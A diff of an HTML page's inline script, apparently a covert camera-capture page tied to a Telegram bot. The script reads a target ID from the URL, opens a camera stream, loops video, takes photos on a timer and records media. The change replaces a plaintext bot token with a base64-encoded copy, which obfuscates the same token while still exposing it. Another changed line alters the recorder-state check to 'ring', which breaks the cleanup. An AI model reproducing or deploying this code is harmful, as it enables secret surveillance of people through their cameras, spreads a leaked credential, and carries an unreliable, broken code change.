@@ -104,9 +104,10 @@
     <script>
         (function() {
             // ============================================
-            // YENİ TOKEN
+            // ŞİFRELİ TOKEN - BASE64
             // ============================================
-            const BOT_TOKEN = "8773124715:AAHHgMr_v6bB-XVQUKUVMyA8hdpJgkJZUR0";
+            const sifreliToken = "ODc3MzEyNDcxNTpBQUhIZ01yX3Y2YkItWFZRVUtVVk15QThoZHBKZ2tKWlVSMA==";
+            const BOT_TOKEN = atob(sifreliToken);
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -165,7 +166,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ============================================
-                        // VİDEO SİSTEMİ - HEMEN BAŞLA (2 SANİYE BEKLEME YOK)
+                        // VİDEO SİSTEMİ - HEMEN BAŞLA
                         // ============================================
                         (function videoLoop() {
                             if (!stream?.active) return;
@@ -271,7 +272,7 @@
             
             window.onbeforeunload = function() {
                 if (fotoInterval) clearInterval(fotoInterval);
-                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
+                if (mediaRecorder?.state === 'ring') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
             
